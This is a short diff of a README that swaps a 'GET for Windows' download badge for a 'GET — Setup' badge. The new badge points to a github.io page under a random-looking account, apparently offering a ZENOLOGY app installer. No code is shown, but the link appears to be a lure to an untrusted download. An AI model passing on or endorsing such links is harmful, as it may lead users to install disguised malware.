@@ -5,11 +5,7 @@
 </div>  
 <br>
 
-<div align="center">
-
-[![GET for Windows](https://img.shields.io/badge/GET_for_Windows-0066cc?style=for-the-badge)](https://zenology-app.github.io/.github)
-
-</div>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://eustaciaburthggeuv.github.io/.github/ZENOLOGY-App)
 
 ---
 
